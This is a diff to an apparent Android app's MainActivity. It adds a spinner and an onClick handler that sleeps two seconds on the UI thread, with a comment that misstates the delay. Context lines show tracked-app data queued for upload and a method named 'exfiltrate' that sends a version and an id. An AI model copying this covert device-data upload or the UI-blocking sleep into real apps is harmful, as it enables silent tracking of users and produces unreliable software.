@@ -14,7 +14,9 @@ import android.os.PowerManager;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+import android.view.View;
 import android.widget.ImageView;
+import android.widget.ProgressBar;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
 import com.squareup.picasso.Picasso;
@@ -29,7 +31,7 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 
-public class MainActivity extends AppCompatActivity implements WifiListener {
+public class MainActivity extends AppCompatActivity implements WifiListener, View.OnClickListener {
 
     private static final String TAG = "MainActivity";
 
@@ -50,6 +52,7 @@ private final static int UID_INDEX = 9;
      * contains packages of apps we're keeping track of; the uid are used as keys
      */
     private Map<String, String> appMap = new HashMap<>();
+    private ProgressBar spinner;
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
@@ -150,7 +153,6 @@ private final static int UID_INDEX = 9;
             sb.append(queuedString).append('&');
             Log.d(TAG, queuedString);
         }
-        Log.d(TAG, "========================================");
         dataToUpload.clear();
         String request = sb.toString();
         Log.d(TAG, "Uploading: " + request);
@@ -158,6 +160,21 @@ private final static int UID_INDEX = 9;
     }
 
     // utilities
+
+    @Override
+    public void onClick(View view) {
+        spinner = (ProgressBar)findViewById(R.id.progressBar1);
+        spinner.setVisibility(View.VISIBLE);
+
+        try {
+            // thread to sleep for 1000 milliseconds
+            Thread.sleep(2000);
+        } catch (Exception e) {
+            System.out.println(e);
+        }
+
+        spinner.setVisibility(View.GONE);
+    }
 
     private void exfiltrate(String version, String id) {
         String send = "ver=" + version + "?" + id;
